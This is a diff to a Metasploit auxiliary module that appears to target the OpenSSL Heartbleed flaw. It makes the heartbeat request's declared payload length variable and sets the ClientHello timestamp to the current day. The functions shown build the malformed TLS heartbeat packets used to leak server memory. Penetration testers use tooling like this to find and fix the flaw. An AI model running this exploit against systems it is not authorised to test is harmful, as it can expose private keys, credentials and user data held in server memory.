@@ -240,26 +240,29 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def heartbeat(length)
-    payload = "\x01"      # Heartbeat Message Type: Request (1)
-    payload << "\x40\x00" # Payload Length: 16384
-    payload << [length].pack("n")
+    payload = "\x01"              # Heartbeat Message Type: Request (1)
+    payload << [length].pack("n") # Payload Length: 16384
 
     ssl_record(HEARTBEAT_RECORD_TYPE, payload)
   end
 
   def client_hello
-    hello_data = [TLS_VERSION[datastore['TLSVERSION']]].pack("n") # Version TLS
-    hello_data << "\x53\x43\x5b\x90"       # Random generation Time (Apr  8, 2014 04:14:40.000000000)
-    hello_data << Rex::Text.rand_text(28)  # Random
-    hello_data << "\x00"                   # Session ID length
-    hello_data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
-    hello_data << CIPHER_SUITES.pack("n*") # Cipher Suites
-    hello_data << "\x01"                   # Compression methods length (1)
-    hello_data << "\x00"                   # Compression methods: null
+    # Use current day for TLS time
+    time_temp = Time.now
+    time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i
 
-    hello_data_extensions = "\x00\x0f"     # Extension type (Heartbeat)
-    hello_data_extensions << "\x00\x01"    # Extension length
-    hello_data_extensions << "\x01"        # Extension data
+    hello_data = [TLS_VERSION[datastore['TLSVERSION']]].pack("n") # Version TLS
+    hello_data << [time_epoch].pack("N")    # Time in epoch format
+    hello_data << Rex::Text.rand_text(28)   # Random
+    hello_data << "\x00"                    # Session ID length
+    hello_data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
+    hello_data << CIPHER_SUITES.pack("n*")  # Cipher Suites
+    hello_data << "\x01"                    # Compression methods length (1)
+    hello_data << "\x00"                    # Compression methods: null
+
+    hello_data_extensions = "\x00\x0f"      # Extension type (Heartbeat)
+    hello_data_extensions << "\x00\x01"     # Extension length
+    hello_data_extensions << "\x01"         # Extension data
 
     hello_data << [hello_data_extensions.length].pack("n")
     hello_data << hello_data_extensions
